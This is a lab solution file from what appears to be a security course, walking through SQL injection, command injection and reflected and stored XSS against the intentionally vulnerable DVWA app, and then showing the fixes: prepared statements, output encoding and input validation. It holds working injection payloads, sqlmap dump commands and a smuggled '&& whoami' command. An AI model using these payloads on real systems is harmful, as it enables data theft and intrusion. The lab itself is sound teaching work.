# Day 8 Lab — Solution

**Scope note on this file:** this task's validation was **static only**
(`docker compose config -q`) — the commands and output below are the documented,
reproducible recipe (matching every other day's SOLUTION.md format), not a captured
transcript from an actual run of this specific lab. If any exact byte (a hash, a
`user_token` value, an exact HTML fragment) differs slightly against the real
`vulnerables/web-dvwa` image you pull, the *shape* and *mechanism* below are what to
expect and rely on; treat literal example values as illustrative, not gospel, and
re-derive them from your own real run the same way every other lab's SOLUTION.md
documents an actually-executed session.

## The exact DVWA URL, cookie, and security level (per the hard constraint)

- **Base URL (from inside the `attacker` container, over `cyberlab`):** `http://dvwa`
  — no port needed; the image's Apache listens on the container's port 80, reached by
  service name only (nothing is published to the host).
- **Login:** `admin` / `password` (DVWA's fixed default account, created by the
  `setup.php` → `create_db` step).
- **Security level used for the Attack Lab (Section 2) and this file's attack
  transcripts:** `low`.
- **Security level used for the Defense Lab (Section 3):** `impossible`.
- **Session cookie shape, once `dvwa_setup.sh low` succeeds:**
  `PHPSESSID=<32-hex-char-value>; security=low` — the exact value is per-session
  (regenerated every time `dvwa_setup.sh` logs in fresh), which is why every command in
  this lab captures it live with `dvwa_setup.sh ... | tail -1 | sed 's/^Cookie: //'`
  rather than hardcoding one.
- **SQLi target URL used by the Verify command and Step 3's `sqlmap` run:**
  `http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#`

## Step 1 — Manual recon of the SQLi point

```sh
curl -s -H "Cookie: $COOKIE" "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#"
```

Expected shape:

```html
...
<pre>
ID: 1
First name: admin
Surname: admin
</pre>
...
```

Then the single-quote probe:

```sh
curl -s -H "Cookie: $COOKIE" "http://dvwa/vulnerabilities/sqli/?id=1%27&Submit=Submit#"
```

Expected shape at `low`: a raw SQL error surfaced onto the page (e.g. mentioning
`You have an error in your SQL syntax`), or, depending on PHP/MySQL error-display
settings, silently no "First name" block at all where `id=1` produced one — either way,
the output's *shape changed* relative to the clean `id=1` request, which is the signal
Section 1 of the content file calls out as the actual confirmation, not the literal
error text.

## Step 2 — Column count, then the manual UNION dump

```sh
curl -s -H "Cookie: $COOKIE" "http://dvwa/vulnerabilities/sqli/?id=1%27+ORDER+BY+3--+-&Submit=Submit#"
```

Expected: an SQL error (`Unknown column '3' in 'order clause'` or similar) — confirms
the query returns fewer than 3 columns. Re-run with `ORDER BY 2` (no error) and
`ORDER BY 1` to bound it exactly: DVWA's `sqli` page query returns **2** columns
(`first_name`, `last_name`).

```sh
curl -s -H "Cookie: $COOKIE" "http://dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%2Cpassword+FROM+users--+-&Submit=Submit#"
```

Expected shape — every row of the `users` table rendered into the page's
"First name / Surname" slots:

```
ID: 1' UNION SELECT user,password FROM users-- -
First name: admin
Surname: 5f4dcc3b5aa765d61d8327deb882cf99
First name: gordonb
Surname: e99a18c428cb38d5f260853678922e03
First name: 1337
Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
...
```

(`5f4dcc3b5aa765d61d8327deb882cf99` is the well-known MD5 of `password` — DVWA's seed
data is publicly documented to use unsalted MD5 for exactly this kind of teaching
exercise; cracking it is Day 3's technique, not today's, named here only because it's
visibly the same hash format.)

## Step 3 — `sqlmap`

```sh
sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="$COOKIE" --batch --dbs
```

Expected tail of output:

```
[INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0
[INFO] fetching database names
available databases [2]:
[*] dvwa
[*] information_schema
```

```sh
sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="$COOKIE" --batch -D dvwa -T users -C user,password --dump
```

Expected: a table dump of the `dvwa.users` table's `user`/`password` columns matching
Step 2's manually-dumped rows exactly — same data, automated.

## Step 4 — Command injection

```sh
curl -s -H "Cookie: $COOKIE" --data-urlencode "ip=127.0.0.1 && whoami" --data-urlencode "Submit=Submit" "http://dvwa/vulnerabilities/exec/"
```

Expected shape:

```
PING 127.0.0.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.05 ms
...
www-data
```

The `www-data` line (or similar, the Apache worker's user) is `whoami`'s output,
chained on after `ping`'s own output by the shell's `&&` — nothing about DVWA's PHP
executed a second command intentionally; the shell it invoked did.

## Step 5 — Reflected XSS

```sh
curl -s -H "Cookie: $COOKIE" --data-urlencode "name=<script>alert(1)</script>" -G "http://dvwa/vulnerabilities/xss_r/"
```

Expected: the response HTML contains, verbatim and unencoded:

```html
<script>alert(1)</script>
```

spliced directly where the page echoes the `name` parameter back — no `&lt;`/`&gt;`
anywhere around it, confirming zero output encoding at `low`.

## Step 6 — Stored XSS

```sh
curl -s -H "Cookie: $COOKIE" --data-urlencode "txtName=attacker" --data-urlencode "mtxMessage=<script>alert(document.cookie)</script>" --data-urlencode "btnSign=Sign Guestbook" "http://dvwa/vulnerabilities/xss_s/"
curl -s -H "Cookie: $COOKIE" "http://dvwa/vulnerabilities/xss_s/"
```

Expected: the **second** `curl` call (a fresh page load, no payload in this request at
all) still contains the unencoded `<script>alert(document.cookie)</script>` in the
guestbook listing — proof it round-tripped through storage and renders for every
future load, not just the submitting request.

## Verify command, spelled out

```sh
cd cyber_security/labs/base
docker compose exec attacker sh -c '
COOKIE=$(bash /loot/day08/dvwa_setup.sh low | tail -1 | sed "s/^Cookie: //")
sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="$COOKIE" --batch --dbs 2>/dev/null | grep -qi "available databases" && echo ATTACK_OK
'
```

Expected: `ATTACK_OK` — `sqlmap`'s `--dbs` output contains the literal line
`available databases`, matched case-insensitively by `grep -qi`.

## Defense Lab — before/after

### Defense 1 — prepared statements (`impossible` level)

```sh
COOKIE=$(bash /loot/day08/dvwa_setup.sh impossible | tail -1 | sed 's/^Cookie: //')
curl -s -H "Cookie: $COOKIE" "http://dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%2Cpassword+FROM+users--+-&Submit=Submit#"
```

Expected: no dumped rows — either an empty result set or a generic "no data" message.
Inspecting `vulnerabilities/sqli/source/impossible.php` inside the `dvwa` image shows
the query is built as (paraphrased):

```php
$id = $GLOBALS['___mysqli_ston']; // simplified
$stmt = $pdo->prepare('SELECT first_name, last_name FROM users WHERE user_id = (:id) AND user_id = (:id)');
$stmt->bindParam(':id', $id, PDO::PARAM_INT);
$stmt->execute();
```

— a PDO prepared statement with a bound, type-checked (`PARAM_INT`) placeholder.
Compare directly against `source/low.php`'s
`"SELECT first_name, last_name FROM users WHERE user_id = '$id';"` string
concatenation to see the entire fix is structural (Drill 2's exact pattern), plus
`impossible.php` additionally casts `$id` to an integer before use — belt-and-suspenders
type enforcement on top of the parameterization.

### Defense 2 — output encoding (`impossible` level)

```sh
COOKIE=$(bash /loot/day08/dvwa_setup.sh impossible | tail -1 | sed 's/^Cookie: //')
curl -s -H "Cookie: $COOKIE" --data-urlencode "name=<script>alert(1)</script>" -G "http://dvwa/vulnerabilities/xss_r/"
```

Expected: the response now contains `&lt;script&gt;alert(1)&lt;/script&gt;` instead of
a live tag — `impossible.php` wraps the echoed value in `htmlspecialchars($name)`.

### Defense 3 — command-injection fix (`impossible` level)

```sh
COOKIE=$(bash /loot/day08/dvwa_setup.sh impossible | tail -1 | sed 's/^Cookie: //')
curl -s -H "Cookie: $COOKIE" --data-urlencode "ip=127.0.0.1 && whoami" --data-urlencode "Submit=Submit" "http://dvwa/vulnerabilities/exec/"
```

Expected: an input-validation rejection (e.g. "Invalid IP" style message) instead of
ping output at all — `impossible.php` checks `$ip` against a strict IP-address regex
before it ever reaches a shell, and separately wraps whatever reaches the shell command
in `escapeshellarg()`. Either control alone would have stopped this specific payload;
DVWA's reference fix applies both.

## Notes on `dvwa_setup.sh`'s field-name assumptions

This script assumes (as of the well-established, long-stable DVWA markup this image
ships): `login.php` has `username`, `password`, `user_token`, `Login` fields;
`setup.php`'s create/reset button is named `create_db`; `security.php` has a `security`
select and `seclev_submit` submit button, plus (in newer DVWA) its own `user_token`
CSRF field, which the script conditionally includes only if it finds one. If your
pulled image's markup differs, `curl`-ing each page raw (`curl -s http://dvwa/login.php`
etc., matching Day 1's recon habit) and diffing the real field names against these
assumptions is the fix — not a sign the lab itself is broken.
